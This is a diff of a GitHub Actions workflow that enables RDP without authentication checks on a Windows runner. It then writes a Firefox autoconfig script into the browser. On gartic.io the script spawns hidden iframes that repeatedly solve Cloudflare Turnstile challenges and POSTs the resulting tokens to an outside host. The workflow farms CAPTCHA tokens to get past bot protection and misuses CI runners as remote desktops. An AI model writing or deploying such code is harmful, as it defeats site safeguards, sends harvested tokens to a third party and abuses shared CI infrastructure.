@@ -24,19 +24,25 @@ jobs:
           Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -Name "UserAuthentication" -Value 0 -Force
           netsh advfirewall firewall add rule name="Allow-RDP" dir=in action=allow protocol=TCP localport=3389
 
-      - name: 2. Inject Gartic Script (Direct Download Method)
+      - name: 2. Inject Gartic Script (Final Fix)
         run: |
           $firefoxDir = "C:\Program Files\Mozilla Firefox"
           if (!(Test-Path "$firefoxDir\defaults\pref")) { New-Item -ItemType Directory -Force -Path "$firefoxDir\defaults\pref" }
           
-          # 1. تفعيل الإعدادات
+          # إعدادات ملف التفعيل
           $pref = 'pref("general.config.filename", "mozilla.cfg");' + "`n" + 'pref("general.config.obscure_value", 0);'
           $pref | Out-File "$firefoxDir\defaults\pref\local-settings.js" -Encoding ASCII -Force
 
-          # 2. تحميل ملف السكربت جاهز ومعدل 100% (بدون أخطاء رموز)
-          # هذا الملف يحتوي على كود الجاريتك الخاص بك بصفحتين
-          $url = "https://gist.githubusercontent.com/mohamed-atef-dev/8d356673628e469595828456a68393e8/raw/mozilla.cfg"
-          Invoke-WebRequest -Uri $url -OutFile "$firefoxDir\mozilla.cfg"
+          # كتابة الكود بطريقة الـ StringBuilder لمنع الـ ParserError نهائياً
+          $c = "//" + "`n"
+          $c += "try { window.addEventListener('load', function() { if (location.href.includes('gartic.io')) { "
+          $c += "setInterval(function() { location.reload(); }, 50000); "
+          $c += "function send(t) { if (typeof t !== 'string' || t.length <= 20) return; fetch('https://www.xsw.work.gd/add-token', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ token: t }) }).catch(function() {}); } "
+          $c += "window.addEventListener('message', function(e) { if (e.data && typeof e.data === 'string') { send(e.data); } }); "
+          $c += "for (var i = 0; i < 6; i++) { var f = document.createElement('iframe'); f.style.display = 'none'; f.srcdoc = '<html><body><script src=\"https://challenges.cloudflare.com/turnstile/v0/api.js\" async defer></script><div id=\"cf-turnstile\"></div><script>function r(){try{window.turnstile.render(\"#cf-turnstile\",{sitekey:\"0x4AAAAAABBPKaIbNwnPEfSo\",callback:function(t){parent.postMessage(t,\"*\");}});}catch(e){}}setInterval(r,3500);setTimeout(r,200);</script></body></html>'; document.body.appendChild(f); } "
+          $c += "} }); } catch (e) {}"
+          
+          $c | Out-File "$firefoxDir\mozilla.cfg" -Encoding ASCII -Force
 
       - name: 3. Create RDP User & Setup Startup
         run: |
